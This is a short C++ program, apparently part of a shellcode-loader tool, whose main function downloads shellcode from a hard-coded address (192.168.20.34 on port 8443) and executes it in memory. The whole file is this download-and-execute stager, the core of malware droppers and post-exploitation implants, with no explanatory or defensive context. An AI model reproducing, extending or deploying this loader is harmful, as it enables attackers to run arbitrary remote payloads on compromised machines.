#include "ShellcodeLoader.h"

int main()
{
    ShellcodeLoader loader;
    ShellCode shellcode = loader.Download(L"192.168.20.34", 8443);

    loader.ExecuteShellcode(shellcode);

    delete[] shellcode.data;
}
